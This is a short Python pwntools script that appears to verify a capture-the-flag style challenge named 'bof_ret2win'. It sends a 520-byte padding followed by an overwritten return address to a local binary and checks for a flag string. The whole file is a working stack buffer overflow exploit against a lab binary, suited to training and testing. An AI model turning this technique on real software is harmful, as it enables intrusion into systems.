#!/usr/bin/env python3
from pathlib import Path

from pwn import context, process

HERE = Path(__file__).resolve().parent
BINARY = HERE / "bof_ret2win"
EXPECTED = b"KSJ{RET2WIN_VERIFIED}"
WIN = b"\x56\x11\x40\x00\x00\x00\x00\x00"

context.arch = "amd64"
context.log_level = "error"

tube = process([str(BINARY)], cwd=str(HERE))
payload = b"A" * 520 + WIN
tube.sendafter(b"Send payload:\n", payload)
output = tube.recvall(timeout=2)
assert EXPECTED in output, output
print(f"[PASS] bof_ret2win: payload={len(payload)} bytes, win=0x401156 (little endian)")
